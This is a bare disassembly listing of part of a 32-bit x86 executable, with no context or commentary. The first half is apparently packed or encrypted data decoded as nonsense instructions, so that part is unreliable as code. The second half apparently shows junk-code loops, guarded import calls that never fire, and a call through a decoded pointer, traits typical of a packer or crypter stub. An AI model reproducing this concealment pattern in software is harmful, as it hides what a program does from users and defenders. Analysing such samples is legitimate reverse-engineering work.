  4057d4:	rol    BYTE PTR [ebx+0x4f1acc99],cl
  4057da:	mov    eax,ds:0x5228e2fd
  4057df:	shl    BYTE PTR [edx-0x84e265e],cl
  4057e5:	pop    edx
  4057e6:	sub    dh,cl
  4057e8:	xchg   ebx,eax
  4057e9:	mov    ah,0x8e
  4057eb:	sub    BYTE PTR [ebx+0x68],dl
  4057ee:	sar    al,cl
  4057f0:	shl    DWORD PTR [esi-0x78b200ed],1
  4057f6:	ret    0xbd4c
  4057f9:	test   eax,0xf5c8a876
  4057fe:	stos   BYTE PTR es:[edi],al
  4057ff:	pop    eax
  405800:	xor    bl,bl
  405802:	hlt    
  405803:	or     DWORD PTR [eax-0x44],ebx
  405806:	jg     0x4057dc
  405808:	jle    0x4057ec
  40580a:	push   ds
  40580b:	mov    esi,0x3df7ccfd
  405810:	push   es
  405811:	out    0xda,al
  405813:	mov    bh,0x91
  405815:	or     al,0xce
  405817:	mov    edi,0xc5cfdeab
  40581c:	or     DWORD PTR [edi+0x3f],ecx
  40581f:	rcr    edx,0x1b
  405822:	mov    eax,0xccddf447
  405827:	mov    ebp,0x88f5b46
  40582c:	adc    cl,BYTE PTR [eax+0x2b]
  40582f:	inc    edi
  405830:	or     ch,BYTE PTR ss:[ecx+0x183fcbc]
  405837:	and    DWORD PTR [ebp-0x72],esi
  40583a:	test   eax,0xdba35eb
  40583f:	inc    edi
  405840:	fsub   DWORD PTR ds:0x1104225c
  405846:	xor    DWORD PTR [ecx+0x22de98c9],0x8b1f6f05
  405850:	scas   al,BYTE PTR es:[edi]
  405851:	sub    eax,DWORD PTR [ecx]
  405853:	jmp    0x4058cb
  405855:	scas   eax,DWORD PTR es:[edi]
  405856:	jno    0x40583d
  405858:	dec    esi
  405859:	sub    edi,DWORD PTR [edi-0x68]
  40585c:	clc    
  40585d:	aad    0x79
  40585f:	xor    cl,cl
  405861:	add    al,0x69
  405863:	adc    eax,0xc54e1939
  405868:	sub    DWORD PTR [ebx+0x3e6f2b],edi
  40586e:	sbb    ax,0xec0c
  405872:	jmp    FWORD PTR [edi+edx*8]
  405875:	sub    BYTE PTR [ecx+ebp*4],cl
  405878:	ins    BYTE PTR es:[edi],dx
  405879:	xchg   edi,eax
  40587a:	icebp  
  40587b:	lahf   
  40587c:	cmp    DWORD PTR [ebx-0x52],ebx
  40587f:	push   es
  405880:	repnz loop 0x4058f1
  405883:	mov    esi,ebp
  405885:	inc    esi
  405886:	xchg   edi,eax
  405887:	(bad)  
  405888:	out    0x71,al
  40588a:	cmp    al,0x82
  40588c:	(bad)  
  40588d:	add    BYTE PTR [edx],bl
  40588f:	dec    esi
  405890:	dec    ebp
  405891:	sub    al,0x8f
  405893:	or     eax,0xb7afff29
  405898:	nop
  405899:	inc    ebp
  40589a:	inc    dx
  40589c:	push   ds
  40589d:	xchg   esp,eax
  40589e:	cdq    
  40589f:	mov    bh,BYTE PTR [ebx+0x16a64555]
  4058a5:	and    eax,DWORD PTR [ebx+edi*1+0x5f]
  4058a9:	loopne 0x4058dc
  4058ab:	imul   esp,eax,0x40028774
  4058b1:	int    0xe2
  4058b3:	enter  0x4dc6,0x2e
  4058b7:	pop    ebx
  4058b8:	mov    bh,0xc0
  4058ba:	push   ss
  4058bb:	test   DWORD PTR [ebx-0x7ad3513a],eax
  4058c1:	xchg   edi,eax
  4058c2:	inc    edi
  4058c3:	pop    ecx
  4058c4:	add    DWORD PTR [esi-0x49],0xcac8660
  4058cb:	push   ecx
  4058cc:	xchg   BYTE PTR [ebp-0x4fec9cd7],dl
  4058d2:	xchg   ecx,eax
  4058d3:	dec    esi
  4058d4:	mov    esp,0xc7994dda
  4058d9:	int    0xbc
  4058db:	test   BYTE PTR [ebp+ecx*4+0x52639935],bl
  4058e2:	ret    0xe113
  4058e5:	xor    al,0x69
  4058e7:	sub    cl,BYTE PTR [edx+eax*2+0x32]
  4058eb:	loopne 0x4058fc
  4058ed:	push   esi
  4058ee:	cmp    al,0xdf
  4058f0:	add    DWORD PTR [ecx+edx*4+0x70],edx
  4058f4:	mov    bh,BYTE PTR [edx]
  4058f6:	jmp    0x916339d2
  4058fb:	xor    edx,eax
  4058fd:	(bad)  
  4058fe:	and    cl,BYTE PTR [edx-0xfe27a35]
  405904:	loope  0x4058d7
  405906:	aas    
  405907:	ret    
  405908:	test   al,0x77
  40590a:	out    0xec,al
  40590c:	add    eax,0x8aa816b2
  405911:	cmp    BYTE PTR [eax+0x7e],bl
  405914:	fisttp WORD PTR [ecx+0x77]
  405917:	mov    al,ds:0xcc7678f8
  40591c:	call   0x13de6db3
  405921:	xor    DWORD PTR [ecx+0x4b],eax
  405924:	jmp    0x8def:0x763ca145
  40592b:	add    eax,0xfe8fd67f
  405930:	stos   BYTE PTR es:[di],al
  405932:	mov    eax,ds:0x9867dd7
  405937:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405938:	(bad)  
  405939:	pushf  
  40593a:	mov    dl,BYTE PTR [esi+esi*8+0x12b697ad]
  405941:	sar    DWORD PTR [edi+0x403c0ba3],0x4e
  405948:	jl     0x4058e9
  40594a:	fwait
  40594b:	cli    
  40594c:	mov    edi,0x1a7bf062
  405951:	(bad)  
  405952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405953:	bound  esi,QWORD PTR [edi-0x47]
  405956:	pop    esp
  405957:	in     eax,0x66
  405959:	mov    ah,BYTE PTR [ebx]
  40595b:	les    esp,FWORD PTR [ebp+0x66]
  40595e:	mov    edi,0x68ae37f1
  405963:	mov    cl,0x54
  405965:	sub    ah,BYTE PTR ds:[esi-0x5d67592a]
  40596c:	mov    ds:0xf8ff81e1,eax
  405971:	add    BYTE PTR [ebx],0xd2
  405974:	(bad)
  405978:	js     0x40594e
  40597a:	cmp    BYTE PTR [ecx-0x2b0def96],cl
  405980:	test   DWORD PTR [edx-0x14004871],0xccaab1ea
  40598a:	jle    0x405923
  40598c:	cwde   
  40598d:	inc    ecx
  40598e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40598f:	in     al,0x6
  405991:	stos   DWORD PTR es:[edi],eax
  405992:	outs   dx,DWORD PTR ds:[esi]
  405993:	repz pop ss
  405995:	fisttp QWORD PTR [edx]
  405997:	mov    ecx,0xa7282997
  40599c:	fcom   DWORD PTR [edi]
  40599e:	ins    DWORD PTR es:[edi],dx
  40599f:	xchg   ecx,eax
  4059a0:	pop    ecx
  4059a1:	push   ds
  4059a2:	push   esi
  4059a3:	out    0x1a,al
  4059a5:	jns    0x4059bd
  4059a7:	pop    eax
  4059a8:	jo     0x40595f
  4059aa:	in     al,dx
  4059ab:	clc    
  4059ac:	mov    edx,0xddd1223
  4059b1:	pop    edi
  4059b2:	stc    
  4059b3:	ins    BYTE PTR es:[edi],dx
  4059b4:	dec    eax
  4059b5:	pop    edi
  4059b6:	repz out 0x0,eax
  4059b9:	cmp    al,0xd8
  4059bb:	jns    0x405985
  4059bd:	mov    edi,0x234bd171
  4059c2:	pop    ss
  4059c3:	mov    ds:0xe8624699,al
  4059c8:	inc    edx
  4059c9:	cmc    
  4059ca:	cmp    dh,BYTE PTR [ebx]
  4059cc:	mov    WORD PTR [ebx],gs
  4059ce:	inc    esi
  4059cf:	lds    ecx,FWORD PTR [edi+ecx*4-0x37]
  4059d3:	sahf   
  4059d4:	or     DWORD PTR [ebx],ebx
  4059d6:	mov    ds:0x3572cf8b,eax
  4059db:	xor    BYTE PTR [edi-0x49],cl
  4059de:	aam    0x92
  4059e0:	stos   DWORD PTR es:[edi],eax
  4059e1:	fld    DWORD PTR ds:0x194b9eb0
  4059e7:	xchg   ebx,eax
  4059e8:	mov    edx,0xcb28b66f
  4059ed:	outs   dx,DWORD PTR ds:[esi]
  4059ef:	mov    ecx,0x47d1fa32
  4059f4:	xor    esp,DWORD PTR [ebx-0x79ccb2ec]
  4059fa:	lahf   
  4059fb:	call   0x3ba8:0x5d8b7795
  405a02:	je     0x405a48
  405a04:	fadd   QWORD PTR [eax+0x6d3c2241]
  405a0a:	adc    al,0xa5
  405a0c:	mov    ah,0x30
  405a0e:	jo     0x4059bc
  405a10:	push   ebp
  405a11:	cmp    BYTE PTR [ecx+0x21],ch
  405a14:	sub    al,0x5c
  405a16:	out    0x57,eax
  405a18:	loope  0x405a36
  405a1a:	push   esi
  405a1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a1c:	pop    ecx
  405a1d:	lock xchg edx,eax
  405a1f:	aas    
  405a20:	mov    cl,0xd9
  405a22:	jle    0x4059c1
  405a24:	mov    WORD PTR [eax-0x7b],ss
  405a27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a28:	push   edi
  405a29:	enter  0xa9d9,0x7d
  405a2d:	adc    DWORD PTR [edi+0x3d],ecx
  405a30:	adc    eax,0xfd200457
  405a35:	dec    eax
  405a36:	mov    bh,0x42
  405a38:	mov    ds:0xaa919cd0,al
  405a3d:	mov    BYTE PTR [ecx],bl
  405a3f:	dec    ebx
  405a40:	fucom  st(6)
  405a42:	and    dh,BYTE PTR [ebx+edx*1+0x10]
  405a46:	cmp    al,0xca
  405a48:	push   ebx
  405a49:	dec    esi
  405a4a:	loop   0x405a81
  405a4c:	out    dx,al
  405a4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a4e:	(bad)  
  405a4f:	push   ebp
  405a50:	mov    bl,0x4f
  405a52:	add    eax,0xc685b8a3
  405a57:	mov    bh,0x53
  405a59:	test   eax,0xf1d948f2
  405a5e:	push   ebp
  405a5f:	imul   ecx,DWORD PTR [ebx+0x6b],0xffffff84
  405a63:	or     cl,dl
  405a65:	out    0x4c,al
  405a67:	jb     0x405a00
  405a69:	adc    eax,0xc8ddee3b
  405a6e:	stc    
  405a6f:	and    DWORD PTR [ecx+eax*1+0x40],ebx
  405a73:	js     0x405a99
  405a75:	adc    ebx,ebx
  405a77:	pop    eax
  405a78:	loope  0x405aba
  405a7a:	cli    
  405a7b:	data16 mov bl,0x85
  405a7e:	scas   al,BYTE PTR es:[edi]
  405a7f:	sub    al,0xd9
  405a81:	scas   al,BYTE PTR es:[edi]
  405a82:	mov    ebx,DWORD PTR [ecx]
  405a84:	push   eax
  405a85:	cmp    DWORD PTR [eax+0x7fe8c740],0xffffff98
  405a8c:	mov    dl,0xd4
  405a8e:	jo     0x405adf
  405a90:	std    
  405a91:	push   cs
  405a92:	xchg   esi,eax
  405a93:	cdq    
  405a94:	push   ebx
  405a95:	ja     0x405a5c
  405a97:	cmp    al,0x7f
  405a99:	fadd   QWORD PTR ds:0xbbd6b325
  405a9f:	mov    ch,0x82
  405aa1:	push   ss
  405aa2:	dec    eax
  405aa3:	lock or bh,ch
  405aa6:	pop    ebx
  405aa7:	xchg   DWORD PTR [edx+0x7875adcf],eax
  405aad:	jb     0x405a72
  405aaf:	scas   al,BYTE PTR es:[edi]
  405ab0:	jmp    0xa48:0x58664a74
  405ab7:	cwde   
  405ab8:	dec    eax
  405ab9:	test   al,0xe6
  405abb:	cmp    al,0x38
  405abd:	fisttp DWORD PTR [ecx+0x3d]
  405ac0:	adc    eax,0xd294f16b
  405ac5:	cdq    
  405ac6:	mov    edi,edx
  405ac8:	rcl    DWORD PTR [eax-0x7c93565],1
  405ace:	push   ss
  405acf:	inc    ebp
  405ad0:	and    ecx,DWORD PTR [ebx+0x66f7cdeb]
  405ad6:	inc    ebx
  405ad7:	mov    esp,0x487c1e68
  405adc:	mov    ?,WORD PTR [ebx-0x3b]
  405adf:	mov    edx,0xc79b4688
  405ae4:	test   eax,0x2425af5c
  405ae9:	mov    dl,0xd6
  405aeb:	sub    ebp,eax
  405aed:	mov    eax,0x9badcac
  405af2:	call   0x746de156
  405af7:	(bad)  
  405af8:	sar    BYTE PTR [ebx+esi*8+0xb],1
  405afc:	(bad)  
  405afd:	add    eax,0x7e256a7f
  405b02:	pop    edi
  405b03:	and    edx,0x66a6e477
  405b09:	stos   DWORD PTR es:[edi],eax
  405b0a:	xchg   ebp,eax
  405b0b:	loop   0x405ab8
  405b0d:	push   es
  405b0e:	mov    al,0xf3
  405b10:	xor    esi,DWORD PTR [edi+0xa57f7f5]
  405b16:	mov    esi,ss
  405b18:	jmp    0xf2:0xa78e4efa
  405b1f:	or     DWORD PTR [edi-0x2be09685],ebx
  405b25:	mov    edi,0x2d296b85
  405b2a:	push   ebx
  405b2b:	cmc    
  405b2c:	hlt    
  405b2d:	cmp    ecx,DWORD PTR [eax-0x50fad2cc]
  405b33:	and    eax,esp
  405b35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b36:	xchg   ecx,eax
  405b37:	(bad)  
  405b38:	push   ebx
  405b39:	mov    WORD PTR [ecx+0x72890680],ss
  405b3f:	les    ecx,FWORD PTR [ebx]
  405b41:	cmp    DWORD PTR [ebp+0x3e],0x23
  405b45:	or     edx,eax
  405b47:	sbb    DWORD PTR [ebp+0x4ffd2a91],ebp
  405b4d:	rol    DWORD PTR [edi+0x126b9235],1
  405b53:	mov    cl,0x1d
  405b55:	jge    0x405bbc
  405b57:	push   edx
  405b58:	or     esp,ecx
  405b5a:	not    DWORD PTR [eax+0xc7afcc4]
  405b60:	or     esp,esp
  405b62:	mov    bl,0xd4
  405b64:	push   eax
  405b65:	ret    0x6ff4
  405b68:	out    0xd9,eax
  405b6a:	out    dx,al
  405b6b:	push   cs
  405b6c:	lea    ebx,[ebx]
  405b6e:	sahf   
  405b6f:	out    0x2d,eax
  405b71:	jg     0x405b74
  405b73:	or     eax,DWORD PTR [esi-0x92bb892]
  405b79:	push   esi
  405b7a:	pcmpeqw mm0,QWORD PTR [edi+0x568c5d75]
  405b81:	aas    
  405b82:	ins    DWORD PTR es:[edi],dx
  405b83:	fild   WORD PTR [ebp-0x5ee08b8c]
  405b89:	nop
  405b8a:	fmul   st(4),st
  405b8c:	ins    DWORD PTR es:[edi],dx
  405b8d:	jns    0x405b98
  405b8f:	dec    edi
  405b90:	test   BYTE PTR [edi-0x74],dh
  405b93:	pop    es
  405b94:	mov    ds:0xd16e0364,eax
  405b99:	push   ss
  405b9a:	das    
  405b9b:	cmp    DWORD PTR [ebp-0x2e49cdcf],0xba92c674
  405ba5:	pop    esi
  405ba6:	push   ds
  405ba7:	mov    WORD PTR [edi-0x75524d78],cs
  405bad:	retf   0x5cdb
  405bb0:	pop    ecx
  405bb1:	retf   0x96f5
  405bb4:	mov    ebx,0xd8298880
  405bb9:	inc    esp
  405bba:	(bad)  
  405bbb:	es mov esi,edx
  405bbe:	test   eax,0xde04da01
  405bc3:	leave  
  405bc4:	mov    gs:0xb9dfab46,al
  405bca:	adc    al,0xc7
  405bcc:	out    0x2a,al
  405bce:	mov    ebx,0xc99a584d
  405bd3:	sar    DWORD PTR [edx],0x82
  405bd6:	(bad)  
  405bd8:	inc    edi
  405bd9:	fisttp DWORD PTR [eax+0x10]
  405bdc:	adc    eax,DWORD PTR [ebp+0x73]
  405bdf:	jle    0x405c5d
  405be1:	or     cl,BYTE PTR [ecx]
  405be3:	in     al,0x7c
  405be5:	les    esp,FWORD PTR [esi-0x9]
  405be8:	fdivr  st,st(3)
  405bea:	xchg   esi,eax
  405beb:	mov    dh,0x8d
  405bed:	(bad)  
  405bee:	ja     0x405c0e
  405bf0:	or     DWORD PTR [esi+0x47],esp
  405bf3:	bound  ecx,QWORD PTR [esi-0x269bc2f4]
  405bf9:	int    0x2
  405bfb:	(bad)  
  405bfc:	loopne 0x405c79
  405bfe:	cmp    ebx,DWORD PTR [edi]
  405c00:	pop    ecx
  405c01:	add    eax,0xc6b802c6
  405c06:	push   ebx
  405c07:	jnp    0x405b9c
  405c09:	pop    es
  405c0a:	ja     0x405c1c
  405c0c:	mov    WORD PTR [ebp+ebp*4-0x2d],ds
  405c10:	dec    eax
  405c11:	int3   
  405c12:	scas   al,BYTE PTR es:[edi]
  405c13:	add    dh,cl
  405c15:	nop
  405c16:	inc    ebx
  405c17:	ins    BYTE PTR es:[edi],dx
  405c18:	or     DWORD PTR [edx],0x42525
  405c1e:	std    
  405c1f:	or     BYTE PTR [eax],bl
  405c21:	ret    
  405c22:	jae    0x405c6e
  405c24:	mov    dh,0x81
  405c26:	das    
  405c27:	xor    ebx,DWORD PTR [ecx+0x4911ce5b]
  405c2d:	mov    edx,esp
  405c2f:	sbb    BYTE PTR [ebx-0x7c],bh
  405c32:	mov    dh,0x49
  405c34:	mov    ebp,0x6694b75d
  405c39:	jp     0x405c4a
  405c3b:	pop    esp
  405c3c:	adc    bl,BYTE PTR [ecx+0x53]
  405c3f:	jno    0x405c28
  405c41:	test   DWORD PTR [edi],ebp
  405c43:	aaa    
  405c44:	sub    DWORD PTR [esi+0x2ef20ac3],0x421ae2a1
  405c4e:	add    bh,bh
  405c50:	xor    bh,bh
  405c52:	xor    eax,0x421d3e
  405c57:	push   DWORD PTR ds:0x421aea
  405c5d:	push   DWORD PTR ds:0x421d1e
  405c63:	push   DWORD PTR ds:0x421db2
  405c69:	push   DWORD PTR [ebp-0x30]
  405c6c:	push   DWORD PTR [ebp-0x20]
  405c6f:	mov    eax,DWORD PTR [ebp-0x8]
  405c72:	mov    eax,DWORD PTR [eax]
  405c74:	mov    eax,DWORD PTR [eax]
  405c76:	mov    eax,DWORD PTR [eax]
  405c78:	call   eax
  405c7a:	mov    eax,DWORD PTR [ebp-0x34]
  405c7d:	mov    ecx,DWORD PTR ds:0x421ce2
  405c83:	add    DWORD PTR [eax],ecx
  405c85:	pop    edi
  405c86:	pop    esi
  405c87:	leave  
  405c88:	ret    
  405c89:	push   ebp
  405c8a:	mov    ebp,esp
  405c8c:	sub    esp,0x58
  405c8f:	add    DWORD PTR ds:0x429008,0x42b004
  405c99:	push   ebx
  405c9a:	adc    DWORD PTR ds:0x42a018,0x429010
  405ca4:	push   esi
  405ca5:	push   edi
  405ca6:	and    DWORD PTR ds:0x42c00c,0x6433
  405cb0:	push   0x1f
  405cb2:	lea    eax,[ebp-0x58]
  405cb5:	push   eax
  405cb6:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405cc0:	push   0x0
  405cc2:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405ccc:	call   DWORD PTR ds:0x424034
  405cd2:	call   DWORD PTR ds:0x424004
  405cd8:	and    DWORD PTR ds:0x42a000,0x4473
  405ce2:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ce9:	and    DWORD PTR ds:0x429018,0x0
  405cf3:	mov    ebx,DWORD PTR ds:0x429018
  405cf9:	inc    ebx
  405cfa:	mov    DWORD PTR ds:0x429018,ebx
  405d00:	cmp    DWORD PTR ds:0x429018,0x1f
  405d07:	jne    0x405d1d
  405d0d:	push   0x42b00c
  405d12:	push   0x7f05
  405d17:	call   DWORD PTR ds:0x42403c
  405d1d:	cmp    DWORD PTR ds:0x429018,0x19
  405d24:	jb     0x405cf3
  405d2a:	add    ebx,DWORD PTR ds:0x42a008
  405d30:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d37:	mov    ecx,DWORD PTR [ebp-0x4]
  405d3a:	mov    ebx,0x7510893
  405d3f:	xor    ecx,ebx
  405d41:	or     DWORD PTR ds:0x42b00c,edx
  405d47:	mov    eax,0x3272db
  405d4c:	add    ecx,eax
  405d4e:	sub    DWORD PTR ds:0x42a010,0x429004
  405d58:	mov    DWORD PTR [ebp-0x1c],ecx
  405d5b:	mov    ecx,DWORD PTR [ebp+0x14]
  405d5e:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d68:	test   ecx,ecx
  405d6a:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d74:	je     0x405d92
  405d7a:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d84:	mov    ecx,DWORD PTR [ebp+0x14]
  405d87:	mov    ecx,DWORD PTR [ecx]
  405d89:	add    DWORD PTR ds:0x42a000,ecx
  405d8f:	mov    DWORD PTR [ebp-0x1c],ecx
  405d92:	and    DWORD PTR ds:0x42a010,0x0
  405d9c:	mov    edi,DWORD PTR ds:0x42a010
  405da2:	inc    edi
  405da3:	mov    DWORD PTR ds:0x42a010,edi
  405da9:	cmp    DWORD PTR ds:0x42a010,0x9
  405db0:	jne    0x405dc4
  405db6:	push   DWORD PTR [ebp-0x14]
  405db9:	push   0x423847
  405dbe:	call   DWORD PTR ds:0x424040
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x8
  405dcb:	jne    0x405dde
  405dd1:	mov    edi,DWORD PTR ds:0x42a010
  405dd7:	inc    edi
  405dd8:	mov    DWORD PTR ds:0x42a010,edi
  405dde:	cmp    DWORD PTR ds:0x42a010,0x13
  405de5:	jb     0x405d9c
  405deb:	mov    ecx,0x457a
  405df0:	imul   edx,eax
  405df3:	mov    esi,0x787f
  405df8:	or     DWORD PTR ds:0x428004,0x4238
  405e02:	add    edx,ecx
  405e04:	sbb    DWORD PTR ds:0x429014,0x4641
  405e0e:	xchg   esi,ecx
  405e10:	xor    DWORD PTR ds:0x42801c,edi
  405e16:	mov    edi,0x155c
  405e1b:	sub    edx,edi
  405e1d:	and    DWORD PTR ds:0x42901c,0x60c1
  405e27:	mov    ecx,DWORD PTR [ebp-0x4]
  405e2a:	xor    ecx,ebx
  405e2c:	and    DWORD PTR ds:0x42b014,0x0
  405e36:	mov    esi,DWORD PTR ds:0x42b014
  405e3c:	inc    esi
  405e3d:	mov    DWORD PTR ds:0x42b014,esi
  405e43:	cmp    DWORD PTR ds:0x42b014,0x10
  405e4a:	jne    0x405e5b
  405e50:	push   0x423806
  405e55:	call   DWORD PTR ds:0x424044
  405e5b:	cmp    DWORD PTR ds:0x42b014,0xf
  405e62:	jne    0x405e75
  405e68:	mov    esi,DWORD PTR ds:0x42b014
  405e6e:	inc    esi
  405e6f:	mov    DWORD PTR ds:0x42b014,esi
  405e75:	cmp    DWORD PTR ds:0x42b014,0x1b
  405e7c:	jb     0x405e36
  405e82:	add    ecx,eax
  405e84:	sbb    esi,0x766b
  405e8a:	mov    DWORD PTR [ebp-0x8],ecx
  405e8d:	and    esi,0x21f
  405e93:	mov    ecx,DWORD PTR [ebp-0x14]
  405e96:	mov    DWORD PTR ds:0x42b000,0x19
  405ea0:	cmp    DWORD PTR ds:0x42b000,0x0
  405ea7:	je     0x405f01
  405ead:	cmp    DWORD PTR ds:0x42b000,0x4
  405eb4:	jne    0x405ecd
  405eba:	push   DWORD PTR [ebp-0x1c]
  405ebd:	push   0x429018
  405ec2:	push   0x423a72
  405ec7:	call   DWORD PTR ds:0x424048
  405ecd:	cmp    DWORD PTR ds:0x42b000,0x5
  405ed4:	jne    0x405ee7
  405eda:	mov    esi,DWORD PTR ds:0x42b000
  405ee0:	dec    esi
  405ee1:	mov    DWORD PTR ds:0x42b000,esi
  405ee7:	xor    esi,esi
  405ee9:	add    esi,DWORD PTR ds:0x42b000
  405eef:	dec    esi
  405ef0:	mov    DWORD PTR ds:0x42b000,esi
  405ef6:	jmp    0x405ea0
  405efb:	and    esi,0x686c
  405f01:	xor    ecx,ebx
  405f03:	add    ecx,eax
  405f05:	mov    DWORD PTR [ebp-0x24],ecx
  405f08:	adc    esi,ecx
  405f0a:	mov    ecx,DWORD PTR [ebp-0x4]
  405f0d:	and    DWORD PTR ds:0x428014,0x0
  405f17:	jmp    0x405f29
  405f1c:	mov    esi,DWORD PTR ds:0x428014
  405f22:	inc    esi
  405f23:	mov    DWORD PTR ds:0x428014,esi
  405f29:	cmp    DWORD PTR ds:0x428014,0x14
  405f30:	jae    0x405f5c
  405f36:	cmp    DWORD PTR ds:0x428014,0x1d
  405f3d:	jne    0x405f51
  405f43:	push   0x42b01c
  405f48:	push   DWORD PTR [ebp-0xc]
  405f4b:	call   DWORD PTR ds:0x424014
  405f51:	jmp    0x405f1c
  405f56:	xor    DWORD PTR ds:0x428018,ecx
  405f5c:	xor    ecx,ebx
  405f5e:	add    ecx,eax
  405f60:	add    DWORD PTR ds:0x428004,edx
  405f66:	mov    DWORD PTR [ebp-0x30],ecx
  405f69:	adc    DWORD PTR ds:0x42b01c,edi
  405f6f:	mov    esi,DWORD PTR [ebp-0x4]
  405f72:	xor    DWORD PTR ds:0x42800c,0x2f0f
  405f7c:	xor    esi,ebx
  405f7e:	and    DWORD PTR ds:0x429018,0x0
  405f88:	mov    ecx,DWORD PTR ds:0x429018
  405f8e:	inc    ecx
  405f8f:	mov    DWORD PTR ds:0x429018,ecx
  405f95:	cmp    DWORD PTR ds:0x429018,0x13
  405f9c:	jne    0x405fca
  405fa2:	push   DWORD PTR [ebp-0x18]
  405fa5:	push   0x42b018
  405faa:	push   0x8bc1
  405faf:	push   0x42a018
  405fb4:	push   0x81c2
  405fb9:	push   DWORD PTR [ebp-0x18]
  405fbc:	push   0x8630
  405fc1:	push   DWORD PTR [ebp-0x28]
  405fc4:	call   DWORD PTR ds:0x424018
  405fca:	cmp    DWORD PTR ds:0x429018,0x10
  405fd1:	jb     0x405f88
  405fd7:	movzx  ecx,WORD PTR ds:0x429008
  405fde:	sub    ecx,DWORD PTR ds:0x42a010
  405fe4:	mov    DWORD PTR ds:0x429008,ecx
  405fea:	add    esi,eax
  405fec:	mov    ecx,DWORD PTR [ebp-0x24]
  405fef:	sub    ecx,eax
  405ff1:	lea    edx,[esi-0x3272db]
  405ff7:	xor    DWORD PTR ds:0x428008,0x428000
  406001:	xor    ecx,ebx
  406003:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40600d:	xor    edx,ebx
  40600f:	cmp    edx,ecx
  406011:	mov    DWORD PTR ds:0x428000,0x76f
  40601b:	je     0x4062a3
  406021:	xor    DWORD PTR ds:0x42c010,edx
  406027:	mov    ecx,DWORD PTR [ebp-0x4]
  40602a:	xor    ecx,ebx
  40602c:	or     DWORD PTR ds:0x429014,0x42a01c
  406036:	add    ecx,eax
  406038:	cmp    esi,ecx
  40603a:	mov    DWORD PTR ds:0x42a01c,0x739d
  406044:	jne    0x406280
  40604a:	add    DWORD PTR ds:0x42a00c,0x429004
  406054:	push   DWORD PTR [ebp+0x8]
  406057:	call   0x413c14
  40605c:	mov    DWORD PTR [ebp-0x18],eax
  40605f:	mov    eax,DWORD PTR [ebp-0x4]
  406062:	mov    DWORD PTR ds:0x42c00c,0x1d
  40606c:	cmp    DWORD PTR ds:0x42c00c,0x0
  406073:	je     0x4060a7
  406079:	cmp    DWORD PTR ds:0x42c00c,0x21
  406080:	jne    0x40608f
  406086:	push   DWORD PTR [ebp-0xc]
  406089:	call   DWORD PTR ds:0x42401c
  40608f:	mov    edi,DWORD PTR ds:0x42c00c
  406095:	dec    edi
  406096:	mov    DWORD PTR ds:0x42c00c,edi
  40609c:	jmp    0x40606c
  4060a1:	adc    ecx,DWORD PTR ds:0x428008
  4060a7:	mov    ecx,DWORD PTR [ebp-0x18]
  4060aa:	and    DWORD PTR ds:0x42b01c,0x0
  4060b4:	mov    edi,DWORD PTR ds:0x42b01c
  4060ba:	inc    edi
  4060bb:	mov    DWORD PTR ds:0x42b01c,edi
  4060c1:	cmp    DWORD PTR ds:0x42b01c,0x23
  4060c8:	jne    0x4060da
  4060ce:	push   DWORD PTR [ebp-0x14]
  4060d1:	push   DWORD PTR [ebp-0x28]
  4060d4:	call   DWORD PTR ds:0x424020
  4060da:	cmp    DWORD PTR ds:0x42b01c,0x19
  4060e1:	jb     0x4060b4
  4060e7:	xor    eax,ebx
  4060e9:	add    DWORD PTR ds:0x429018,0x397c
  4060f3:	mov    edi,0x3272db
  4060f8:	sub    DWORD PTR ds:0x428020,0x386b
  406102:	add    eax,edi
  406104:	mov    DWORD PTR ds:0x42900c,0x67dc
  40610e:	cmp    ecx,eax
  406110:	mov    DWORD PTR ds:0x42c00c,0x661b
  40611a:	je     0x406313
  406120:	push   DWORD PTR [ebp-0x18]
  406123:	sub    DWORD PTR ds:0x42800c,0x42a014
  40612d:	push   DWORD PTR [ebp+0x8]
  406130:	and    DWORD PTR ds:0x42b000,0x429010
  40613a:	call   0x41b72b
  40613f:	sub    ecx,DWORD PTR ds:0x42a00c
  406145:	mov    DWORD PTR [ebp-0x18],eax
  406148:	xor    eax,eax
  40614a:	xor    eax,DWORD PTR ds:0x42a01c
  406150:	xor    DWORD PTR ds:0x428018,eax
  406156:	mov    eax,DWORD PTR [ebp-0x4]
  406159:	mov    ecx,DWORD PTR [ebp-0x18]
  40615c:	xor    eax,ebx
  40615e:	add    eax,edi
  406160:	cmp    ecx,eax
  406162:	je     0x406313
  406168:	mov    ecx,DWORD PTR ds:0x429010
  40616e:	add    DWORD PTR ds:0x42a010,ecx
  406174:	mov    eax,DWORD PTR [ebp-0x18]
  406177:	and    DWORD PTR ds:0x42a008,0x0
  406181:	jmp    0x406193
  406186:	mov    ecx,DWORD PTR ds:0x42a008
  40618c:	inc    ecx
  40618d:	mov    DWORD PTR ds:0x42a008,ecx
  406193:	cmp    DWORD PTR ds:0x42a008,0x14
  40619a:	jae    0x40621e
  4061a0:	cmp    DWORD PTR ds:0x42a008,0x1f
  4061a7:	jne    0x4061d5
  4061ad:	push   0x42b010
  4061b2:	push   DWORD PTR [ebp-0x10]
  4061b5:	push   0x4f72
  4061ba:	push   0x42900c
  4061bf:	push   DWORD PTR [ebp-0x24]
  4061c2:	push   0x423992
  4061c7:	push   DWORD PTR [ebp-0x1c]
  4061ca:	push   0x3544
  4061cf:	call   DWORD PTR ds:0x424024
  4061d5:	jmp    0x406186
  4061da:	and    DWORD PTR ds:0x428020,0x0
  4061e4:	mov    ecx,DWORD PTR ds:0x428020
  4061ea:	inc    ecx
  4061eb:	mov    DWORD PTR ds:0x428020,ecx
  4061f1:	cmp    DWORD PTR ds:0x428020,0x1a
  4061f8:	jne    0x406211
  4061fe:	push   DWORD PTR [ebp-0x1c]
